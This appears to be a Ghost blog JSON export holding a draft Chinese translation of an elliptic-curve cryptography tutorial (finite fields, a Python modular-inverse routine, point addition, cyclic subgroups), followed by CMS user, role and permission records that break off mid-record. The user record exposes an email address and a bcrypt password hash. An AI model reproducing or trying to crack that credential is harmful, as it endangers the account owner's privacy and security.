整数对质数p取模的集合就是有限域的一个例子, 一般用 $\\mathbb{Z}/p$, $GF(p)$ 或者\n$\\mathbb{F}_p$ 表示. 这里我们采用最后一种表示方法.\n\n\n在域上存在二元运算: 加法(+)和乘法(·), 他们都满足封闭性, 结合律和交换律. 对这两种操作都存在一个唯一的单位元, 并且对每个元素都有且仅有一个逆元.\n最后, 乘法还满足分配率: $x \\cdot (y + z) = x \\cdot y + x \\cdot z$\n\n\n这个集合由从0到p-1之间的所有整数构成. 加法和乘法遵循模运算法则(也叫\"时钟运算\"). 这里有一些在 $\\mathbb{F}_{23}$ 上运算的例子:\n\n  *   加法: $(18 + 9) \\bmod{23} = 4$ \n *   减法: $(7 - 14) \\bmod{23} = 16$ \n *   乘法: $4 \\cdot 7 \\bmod{23} = 5$ \n *   \n   加法逆运算: $-5 \\bmod{23} = 18$ \n   推导: $(5 + (-5)) \\bmod{23} = (5 + 18) \\bmod{23} = 0$\n    \n *   \n   乘法逆运算: $9^{-1} \\bmod{23} = 18$ \n   推导: $9 \\cdot 9^{-1} \\bmod{23} = 9 \\cdot 18 \\bmod{23} = 1$\n   译者注:\n     根据费马小定理可知, $9^{22} \\bmod{23} = 1$,\n     所以 $9^{-1} \\bmod{23} = 9^{-1+22} \\bmod{23} = 18$\n     这样理解起来要更容易一些\n   \n   \n   \n\n\n\n\n如果这些等式看起来很陌生那么你需要先了解一点关于模运算的基本知识, 可以看看 [Khan\nAcademy的这篇教程](https://www.khanacademy.org/computing/computer-science/cryptography/modarithmetic/a/what-is-modular-arithmetic)\n\n\n正如我们所言, 以p为模的整数是一个域, 它具备上述所有的特征. 需要注意的是p必须是一个质数! 以4为模的整数不是一个域: 2没有乘法逆元(等式 $2\n\\cdot x \\bmod{4} = 1$ 没有解)\n\n以p为模的除法运算\n\n我们将会定义 $\\mathbb{F}_p$ 上的椭圆曲线, 但在那之前我们需要对 $\\mathbb{F}_p$ 上的 $x / y$\n表示什么意思有一个清晰的认识. 根据 $x / y = x \\cdot y^{-1}$, 或者简单的说, x 除以 y 等于 x 乘以 y 的乘法逆元.\n这没什么好奇怪的, 不过它为我们提供了一种计算除法的基本方法: 找到这个数的乘法逆元再用计算乘法的方法在计算它 \n\n\n借助扩展欧几里得算法\n[https://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95]\n计算乘法逆元是比较\"容易\"完成, 在最坏的情况下, 算法的复杂度为 $O(\\log p)$ (或者按位长来算, $O(k)$).\n我们不会详细讲解扩展的欧几里得算法, 因为这不是本文要讨论的, 不过这里有一份Python版的实现代码:\n\n\n译者注: \n  扩展欧几里得算法 也叫 扩展的辗转相除法, \n  该算法在译者的之前的博客 读跨越千年的RSA算法 [http://blog.chxj.name/understanding-rsa-algorithm/] 一文中曾有讲到, \n  有兴趣的读者可以前往阅读\n\n\ndef extended_euclidean_algorithm(a, b):\n    \"\"\"\n    Returns a three-tuple (gcd, x, y) such that\n    a * x + b * y == gcd, where gcd is the greatest\n    common divisor of a and b.\n\n    This function implements the extended Euclidean\n    algorithm and runs in O(log b) in the worst case.\n    \"\"\"\n    s, old_s = 0, 1\n    t, old_t = 1, 0\n    r, old_r = b, a\n\n    while r != 0:\n        quotient = old_r // r\n        old_r, r = r, old_r - quotient * r\n        old_s, s = s, old_s - quotient * s\n        old_t, t = t, old_t - quotient * t\n\n    return old_r, old_s, old_t\n\n\ndef inverse_of(n, p):\n    \"\"\"\n    Returns the multiplicative inverse of\n    n modulo p.\n\n    This function returns an integer m such that\n    (n * m) % p == 1.\n    \"\"\"\n    gcd, x, y = extended_euclidean_algorithm(n, p)\n    assert (n * x + p * y) % p == gcd\n\n    if gcd != 1:\n        # Either n is 0, or p is not a prime number.\n        raise ValueError(\n            '{} has no multiplicative inverse '\n            'modulo {}'.format(n, p))\n    else:\n        return x % p\n\n\n  $\\mathbb{F}_p$ 上的椭圆曲线 \n\n现在, 我们已经掌握了将椭圆曲线限定在 $\\mathbb{F}_p$ 上所需的全部要素, 这些点的集合, 按前一篇文章\n[http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#elliptic-curves]\n可以表示成: \n$$\n\\begin{array}{rcl}\n\\left\\{(x, y) \\in \\mathbb{R}^2 \\right. & \\left. | \\right. & \\left. y^2 = x^3 +\nax + b, \\right. \\\\\n& & \\left. 4a^3 + 27b^2 \\ne 0\\right\\}\\ \\cup\\ \\left\\{0\\right\\}\n\\end{array}\n$$\n现在则应该写成:\n$$\n\\begin{array}{rcl}\n\\left\\{(x, y) \\in (\\mathbb{F}_p)^2 \\right. & \\left. | \\right. & \\left. y^2\n\\equiv x^3 + ax + b \\pmod{p}, \\right. \\\\\n& & \\left. 4a^3 + 27b^2 \\not\\equiv 0 \\pmod{p}\\right\\}\\ \\cup\\ \\left\\{0\\right\\}\n\\end{array}\n$$\n0 仍然是无穷远处的点, 而 a 和 b 是 $\\mathbb{F}_p$ 上的两个整数.\n\n\n以上是当 p = 19, 97, 127, 487 时, 曲线 $y^2 \\equiv x^3 - 7x + 10 \\pmod{p}$ 的图形. 注意, 在每个\nx 坐标上最多有2个点, 且整个图形关于 $y = p / 2$ 水平对称.\n\n\n曲线 $y^2 \\equiv x^3 \\pmod{29}$ 是奇异的并且在有三个点落在 (0,0) 上. 这样的曲线就不是有效的椭圆曲线\n\n\n之前连续的曲线现在变成了xy平面上一些离散的点的集合. 然而我们还是能证明, 即使我们限制了曲线的域, 这个在 $\\mathbb{F}_p$\n上的椭圆曲线仍然是一个阿贝尔群\n\n点加\n\n显然, 为了让加法在 $\\mathbb{F}_p$ 上仍然有效, 我们需要稍微调整一下定义. 在实数域上, 我们说位于一条直线上的三点之和为0($P + Q +\nR = 0$). 我们可以保留这个定义, 但是在 $\\mathbb{F}_p$ 上三点连成一线是什么意思呢?\n\n\n我们说当有一条直线能将三个点连起来时, 三点就位于一条直线上.  当然,\n$\\mathbb{F}_p$(有限域)上的直线和$\\mathbb{R}$(实数域)上的直线是不一样的. 通俗的说, $\\mathbb{F}_p$\n上的直线是指满足方程 $ax + by + c \\equiv 0 \\pmod{p}$ 的所有点 $(x, y)$ 的集合(即加上 \"$(\\text{mod}\\\np)$\" 的标准直线方程).\n\n\n上图为曲线 $y^2 \\equiv x^3 - x + 3 \\pmod{127}$ 上 点$P = (16, 20)$ 和 点$Q = (41, 120)$\n的加法. 看看直线$y \\equiv 4x + 83 \\pmod{127}$是如何通过在平面上不断\"重复\"出现将这些点连接起来的.\n\n\n既然我们在一个群里, 那么点加就具有以下这些我们已知的属性: \n  *   $Q + 0 = 0 + Q = Q$ (根据单位元的定义可得) \n *   已知一个非零点 Q , 其逆元 -Q 将具有与之相同的横坐标和相反的纵坐标. 或者, 也可以表示成 $-Q = (x_Q, -y_Q\n   \\bmod{p})$. 例如, $\\mathbb{F}_{29}$ 上的曲线上有一点 Q = (2, 5), 该点的逆元 $-Q = (2, -5\n   \\bmod{29}) = (2, 24)$ \n *   还有, $P + (-P) = 0$ (根据逆元的定义) \n\n\n\n代数求和\n\n这里计算点加的方程与在前一篇文章里讲的完全一样, 除了我们需要再每个方程末尾加上 $\\text{mod}\\ p$. 所以, 已知 $P = (x_P,\ny_P)$, $Q = (x_Q, y_Q)$ 和 $R = (x_R, y_R)$, 我们可以通过以下方法计算 $P + Q = -R$:\n$$\n\\begin{array}{rcl}\nx_R & = & (m^2 - x_P - x_Q) \\bmod{p} \\\\\ny_R & = & [y_P + m(x_R - x_P)] \\bmod{p} \\\\\n& = & [y_Q + m(x_R - x_Q)] \\bmod{p}\n\\end{array}\n$$\n当 $P \\ne Q$, 斜率 m 可以表示为:\n$$ m = (y_P - y_Q)(x_P - x_Q)^{-1} \\bmod{p} $$\n而当 $P = Q$, 可得: \n$$ m = (3 x_P^2 + a)(2 y_P)^{-1} \\bmod{p} $$\n\n\n上面的方程没有任何变化并非是一个巧合: 事实上, 这些方程在任何域下都是成立的, 无论是有限域还是非有限域(需要排除$\\mathbb{F}_2$ 和\n$\\mathbb{F}_3$ 这两种特殊情况). 我似乎应该为这个说法提供一些依据, 不过问题在于: 关于群论的证明总会涉及到各种复杂的数学概念. 不过,\n我还是找到了一个只使用初等数学概念推导论证的来自Stefan Friedl的证明\n[https://www.uni-regensburg.de/Fakultaeten/nat_Fak_I/friedl/papers/elliptic_2017.pdf]\n. 如果你对为什么这些方程在(几乎)所有域中都能成立感兴趣的话可以前往阅读.\n\n\n回到我们的话题, 我们不会定义一个几何意义的方法了: 事实上这会比较麻烦. 比如说, 在前一篇文章中我们说要计算 $P + P$ 需要在曲线上做一条过 P\n点的切线. 但如果曲线不是连续的, \"切线\"这个词是没有意义的. 我们可以深入研究这个问题,不过这种几何式的方法确实太复杂和难以实践了.\n\n\n不过, 你可以试试这个计算点加的交互式小工具\n[https://andrea.corbellini.name/ecc/interactive/modk-add.html].\n\n椭圆曲线群的阶\n\n我们说有限域上的椭圆曲线由有限个点组成. 那么我们需要回答一个重要的问题: 到底有多少个点呢?\n\n\n首先, 我们说群里点的数量叫做这个群的阶.\n\n\n从 0 到 p-1 逐个尝试所有可能的值显然是不切实际的, 这样需要经过 $O(p^2)$ 次尝试, 如果 p 是一个非常大的质数, 这样做的将会很\"困难\".\n\n\n幸好, 我们还有一种更快的算法来计算群的阶: Schoof's 算法\n[https://en.wikipedia.org/wiki/Schoof%27s_algorithm]. 我们不会深入介绍这个算法的细节 --\n我们只需要知道, 这个算法的时间复杂度为多项式级别.\n\n标量乘法和循环子群\n\n在实数域中, 乘法可以通过如下方式定义: \n$$\nn P = \\underbrace{P + P + \\cdots + P}_{n\\ \\text{times}}\n$$\n然后, 我们可以通过倍加法\n[http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication]\n通过 $O(\\log n)$ 步(或者 $O(k)$, k为数字的位长)得出结果. 这里也有一个计算标量乘法的交互式工具\n[https://andrea.corbellini.name/ecc/interactive/modk-mul.html].\n\n\n离散域 $\\mathbb{F}_p$ 上的椭圆曲线乘法有一个有趣的属性, 当已知曲线 $y^2 \\equiv x^3 + 2x + 3 \\pmod{97}$ 和\n点 $P = (3, 6)$, 现在计算点 P 的(标量)乘积.\n\n\n点 $P = (3, 6)$ 的乘积总共只有 5 个点(0, P, 2P, 3P, 4P) 这些点不断循环出现.\n容易看出椭圆曲线上的标量乘法和模运算加法是比较相似的.\n\n * 0P = 0\n * 1P = (3, 6)\n * 2P = (80, 10)\n * 3P = (80, 87)\n * 4P = (3, 91)\n * 5P = 0\n * 6P = (3, 6)\n * 7P = (80, 10)\n * 8P = (80, 87)\n * 9P = (3, 91)\n * ...\n\n我们马上可以发现两件事: 首先, P的乘积只有5个值, 曲线上其他任何点都没有出现. 其二, 这些点反复循环出现. 我们可以写成:\n\n * 5kP = 0\n * (5k+1)P = P\n * (5k+2)P = 2P\n * (5k+3)P = 3P\n * (5k+4)P = 4P\n\n\n上面5个方程实际上还可以压缩成一个, 多亏有模运算: $kP = (k \\bmod{5})P$\n\n\n不仅如此, 我们还可以验证到这五个点在加法运算下是封闭的. 这意味着: 无论我把 0, P, 2P, 3P, 4P 怎么加, 得到的结果总是这五个点之一.\n再次强调, 椭圆曲线上其他任何的点都不会出现在结果中.\n\n\n不仅仅是P = (3, 6)这个点, 上述规律对曲线上的任何点都是成立的. 当我们把 P 看做一个通用的点: \n$$\nnP + mP = \\underbrace{P + \\cdots + P}_{n\\ \\text{times}} + \\underbrace{P + \\cdots\n+ P}_{m\\ \\text{times}} = (n + m)P\n$$\n这意味着, 如果我们将 P 的两个乘积相加, 将会得到 P 的另一个乘积 (P的乘积在加法运算下是封闭的). 这足以证明\n[https://en.wikipedia.org/wiki/Subgroup#Basic_properties_of_subgroups]\nP的乘积的集合是椭圆曲线群的一个循环子群.\n\n\n\"子群\"是指另一个群的子集构成的群. 而\"循环子群\"是指群里的元素反复循环出现的子群, 正如前面的例子中所展示的. 点 P 则叫做这个循环子群的 生成点或基点\n.\n\n\n循环子群是 ECC 以及其他密码学系统的基础, 在下一篇文章中我们将看到其中的原因.\n\n子群的阶","feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2019-12-23 07:06:44","updated_at":"2019-12-25 12:39:20","published_at":null,"custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null}],"users":[{"id":"1","name":"chxj1992","slug":"chxj1992","ghost_auth_access_token":null,"ghost_auth_id":null,"password":"$2a$10$0MReiHVNWOEegx8fWIewV.u0bTIRDypyK74ssBpkM.QHtjTSVxVkO","email":"chxj1992@gmail.com","profile_image":"//www.gravatar.com/avatar/fc7ac796ac2429f2c49b289cb450aec1?s=250&d=mm&r=x","cover_image":null,"bio":"电子科大2010级\n有理想, 爱折腾, 爱生活","website":"https://blog.chxj.name","location":"Chengdu, China","facebook":null,"twitter":null,"accessibility":null,"status":"active","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"tour":"[\"getting-started\",\"upload-a-theme\",\"featured-post\"]","last_seen":"2019-12-28 03:21:36","created_at":"2019-06-07 06:37:32","updated_at":"2019-12-28 03:21:36"}],"posts_authors":[{"id":"5cfa089b31767300013e0e8b","post_id":"5cfa089b31767300013e0e56","author_id":"1","sort_order":0},{"id":"5cfa089b31767300013e0e8d","post_id":"5cfa089b31767300013e0e57","author_id":"1","sort_order":0},{"id":"5cfa089b31767300013e0e8f","post_id":"5cfa089b31767300013e0e58","author_id":"1","sort_order":0},{"id":"5cfa089b31767300013e0e91","post_id":"5cfa089b31767300013e0e59","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0e93","post_id":"5cfa089b31767300013e0e5a","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0e96","post_id":"5cfa089b31767300013e0e5b","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0e98","post_id":"5cfa089b31767300013e0e5c","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0e9a","post_id":"5cfa089b31767300013e0e5d","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0e9c","post_id":"5cfa089b31767300013e0e5e","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0e9e","post_id":"5cfa089b31767300013e0e5f","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0ea0","post_id":"5cfa089b31767300013e0e60","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0ea3","post_id":"5cfa089b31767300013e0e61","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0ea5","post_id":"5cfa089b31767300013e0e62","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0ea7","post_id":"5cfa089b31767300013e0e63","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0eac","post_id":"5cfa089b31767300013e0e65","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0eaf","post_id":"5cfa089b31767300013e0e66","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0eb4","post_id":"5cfa089b31767300013e0e68","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0eb7","post_id":"5cfa089b31767300013e0e69","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0eb9","post_id":"5cfa089b31767300013e0e6a","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0ebb","post_id":"5cfa089b31767300013e0e6b","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0ebe","post_id":"5cfa089b31767300013e0e6c","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0ec1","post_id":"5cfa089b31767300013e0e6d","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0ec3","post_id":"5cfa089b31767300013e0e6e","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0ec5","post_id":"5cfa089b31767300013e0e6f","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0ec7","post_id":"5cfa089b31767300013e0e70","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0ec9","post_id":"5cfa089b31767300013e0e71","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0eca","post_id":"5cfa089b31767300013e0e72","author_id":"1","sort_order":0},{"id":"5cfa089c31767300013e0ecf","post_id":"5cfa089b31767300013e0e75","author_id":"1","sort_order":0},{"id":"5cfa089d31767300013e0ed0","post_id":"5cfa089b31767300013e0e76","author_id":"1","sort_order":0},{"id":"5cfa089d31767300013e0ed1","post_id":"5cfa089b31767300013e0e77","author_id":"1","sort_order":0},{"id":"5cfa089d31767300013e0ed5","post_id":"5cfa089b31767300013e0e78","author_id":"1","sort_order":0},{"id":"5cfa089d31767300013e0ed6","post_id":"5cfa089b31767300013e0e79","author_id":"1","sort_order":0},{"id":"5cfa089d31767300013e0ed7","post_id":"5cfa089b31767300013e0e7a","author_id":"1","sort_order":0},{"id":"5cfa089d31767300013e0ed8","post_id":"5cfa089b31767300013e0e7b","author_id":"1","sort_order":0},{"id":"5cfa089d31767300013e0ed9","post_id":"5cfa089b31767300013e0e7c","author_id":"1","sort_order":0},{"id":"5cfa089d31767300013e0eda","post_id":"5cfa089b31767300013e0e7d","author_id":"1","sort_order":0},{"id":"5cfa089d31767300013e0edc","post_id":"5cfa089b31767300013e0e7e","author_id":"1","sort_order":0},{"id":"5cfa089d31767300013e0ede","post_id":"5cfa089b31767300013e0e7f","author_id":"1","sort_order":0},{"id":"5cfa089d31767300013e0edf","post_id":"5cfa089b31767300013e0e80","author_id":"1","sort_order":0},{"id":"5cfa089d31767300013e0ee1","post_id":"5cfa089b31767300013e0e81","author_id":"1","sort_order":0},{"id":"5cfa089d31767300013e0ee2","post_id":"5cfa089b31767300013e0e82","author_id":"1","sort_order":0},{"id":"5cfa089d31767300013e0ee3","post_id":"5cfa089b31767300013e0e83","author_id":"1","sort_order":0},{"id":"5cfa089d31767300013e0ee5","post_id":"5cfa089b31767300013e0e85","author_id":"1","sort_order":0},{"id":"5cfa089d31767300013e0ee9","post_id":"5cfa089b31767300013e0e88","author_id":"1","sort_order":0},{"id":"5d6a74073faccd0001d04f26","post_id":"5d6a74073faccd0001d04f25","author_id":"1","sort_order":0},{"id":"5d6bcbec3faccd0001d04fb7","post_id":"5d6bcbeb3faccd0001d04fb6","author_id":"1","sort_order":0},{"id":"5d7b12173faccd0001d04fc4","post_id":"5d7b12173faccd0001d04fc3","author_id":"1","sort_order":0},{"id":"5d871d6c3faccd0001d052e6","post_id":"5d871d6c3faccd0001d052e5","author_id":"1","sort_order":0},{"id":"5ddb49c22ee0ee0001818fa2","post_id":"5ddb49c22ee0ee0001818fa1","author_id":"1","sort_order":0},{"id":"5df35add2ee0ee0001818fd8","post_id":"5df35add2ee0ee0001818fd7","author_id":"1","sort_order":0},{"id":"5df74fdb2ee0ee0001818fe1","post_id":"5df74fdb2ee0ee0001818fe0","author_id":"1","sort_order":0},{"id":"5df750192ee0ee0001818fe8","post_id":"5df750192ee0ee0001818fe7","author_id":"1","sort_order":0},{"id":"5df750602ee0ee0001818ff2","post_id":"5df750602ee0ee0001818ff1","author_id":"1","sort_order":0},{"id":"5dfc7ca42ee0ee000181900f","post_id":"5dfc7ca42ee0ee000181900e","author_id":"1","sort_order":0},{"id":"5e0067842ee0ee000181987c","post_id":"5e0067842ee0ee000181987b","author_id":"1","sort_order":0}],"roles":[{"id":"5cfa062bc67431000127929b","name":"Administrator","description":"Administrators","created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc67431000127929c","name":"Editor","description":"Editors","created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc67431000127929d","name":"Author","description":"Authors","created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc67431000127929e","name":"Contributor","description":"Contributors","created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc67431000127929f","name":"Owner","description":"Blog Owner","created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792a0","name":"Admin Integration","description":"External Apps","created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"}],"roles_users":[{"id":"5cfa062ec6743100012793c6","role_id":"5cfa062bc67431000127929f","user_id":"1"}],"permissions":[{"id":"5cfa062bc6743100012792a1","name":"Export database","object_type":"db","action_type":"exportContent","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792a2","name":"Import database","object_type":"db","action_type":"importContent","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792a3","name":"Delete all content","object_type":"db","action_type":"deleteAllContent","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792a4","name":"Send mail","object_type":"mail","action_type":"send","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792a5","name":"Browse notifications","object_type":"notification","action_type":"browse","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792a6","name":"Add notifications","object_type":"notification","action_type":"add","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792a7","name":"Delete notifications","object_type":"notification","action_type":"destroy","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792a8","name":"Browse posts","object_type":"post","action_type":"browse","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792a9","name":"Read posts","object_type":"post","action_type":"read","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792aa","name":"Edit posts","object_type":"post","action_type":"edit","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792ab","name":"Add posts","object_type":"post","action_type":"add","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792ac","name":"Delete posts","object_type":"post","action_type":"destroy","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792ad","name":"Browse settings","object_type":"setting","action_type":"browse","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792ae","name":"Read settings","object_type":"setting","action_type":"read","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792af","name":"Edit settings","object_type":"setting","action_type":"edit","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792b0","name":"Generate slugs","object_type":"slug","action_type":"generate","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792b1","name":"Browse tags","object_type":"tag","action_type":"browse","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792b2","name":"Read tags","object_type":"tag","action_type":"read","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792b3","name":"Edit tags","object_type":"tag","action_type":"edit","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792b4","name":"Add tags","object_type":"tag","action_type":"add","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792b5","name":"Delete tags","object_type":"tag","action_type":"destroy","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792b6","name":"Browse themes","object_type":"theme","action_type":"browse","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792b7","name":"Edit themes","object_type":"theme","action_type":"edit","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792b8","name":"Activate themes","object_type":"theme","action_type":"activate","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792b9","name":"Upload themes","object_type":"theme","action_type":"add","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792ba","name":"Download themes","object_type":"theme","action_type":"read","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792bb","name":"Delete themes","object_type":"theme","action_type":"destroy","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792bc","name":"Browse users","object_type":"user","action_type":"browse","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792bd","name":"Read users","object_type":"user","action_type":"read","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792be","name":"Edit users","object_type":"user","action_type":"edit","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792bf","name":"Add users","object_type":"user","action_type":"add","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792c0","name":"Delete users","object_type":"user","action_type":"destroy","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792c1","name":"Assign a role","object_type":"role","action_type":"assign","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792c2","name":"Browse roles","object_type":"role","action_type":"browse","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792c3","name":"Browse clients","object_type":"client","action_type":"browse","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792c4","name":"Read clients","object_type":"client","action_type":"read","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792c5","name":"Edit clients","object_type":"client","action_type":"edit","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792c6","name":"Add clients","object_type":"client","action_type":"add","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792c7","name":"Delete clients","object_type":"client","action_type":"destroy","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792c8","name":"Browse subscribers","object_type":"subscriber","action_type":"browse","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792c9","name":"Read subscribers","object_type":"subscriber","action_type":"read","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792ca","name":"Edit subscribers","object_type":"subscriber","action_type":"edit","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792cb","name":"Add subscribers","object_type":"subscriber","action_type":"add","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792cc","name":"Delete subscribers","object_type":"subscriber","action_type":"destroy","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792cd","name":"Browse invites","object_type":"invite","action_type":"browse","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792ce","name":"Read invites","object_type":"invite","action_type":"read","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792cf","name":"Edit invites","object_type":"invite","action_type":"edit","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792d0","name":"Add invites","object_type":"invite","action_type":"add","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792d1","name":"Delete invites","object_type":"invite","action_type":"destroy","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792d2","name":"Download redirects","object_type":"redirect","action_type":"download","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792d3","name":"Upload redirects","object_type":"redirect","action_type":"upload","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 06:37:31"},{"id":"5cfa062bc6743100012792d4","name":"Add webhooks","object_type":"webhook","action_type":"add","object_id":null,"created_at":"2019-06-07 06:37:31","updated_at":"2019-06-07 